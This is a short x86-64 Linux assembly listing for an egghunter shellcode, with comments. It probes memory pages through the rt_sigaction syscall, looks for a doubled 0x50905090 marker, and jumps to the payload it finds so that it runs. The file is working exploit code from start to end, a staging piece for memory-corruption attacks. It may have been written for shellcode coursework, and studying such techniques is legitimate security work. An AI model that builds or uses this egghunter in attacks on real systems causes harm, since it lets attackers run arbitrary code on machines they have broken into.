global _start

section .text



_start:
	xor rax,rax  ; zeroing registers  registers 
	xor rsi, rsi 
	xor rdx, rdx
	xor rcx, rcx 
	xor rdi, rdi 
	push 8    ; prepare  sizeof(sigset_t) 
	pop r10 
entry1:          
	or r15w, 0xfff ; we loop over each page , and we don't add directly 0x1000 as we will put NULL bytes 

entry2:
	inc r15       
	mov rsi, r15 ; prepare RSI to handle syscall 
	push 13 ;rt_sigaction syscall 
	pop rax 
	syscall ;  rt_sigaction 
	cmp al,0xf2   ; if al == f2, is not a valid memory address to increase act structure by page size 
    	jz entry1


found_something:
	mov eax,  0x50905090 ;if rt_sigaction successfully return, let's check if the address contains the egg 

	mov rdi, rsi 
	scasd     
	jnz entry2 ; jmp if eax is not equals  [edi]
	scasd 
	jnz entry2 ; jmp if eax is not equal to [edi +4] 
	jmp rdi ; if we are here, we found the shellcode and we execute it! 

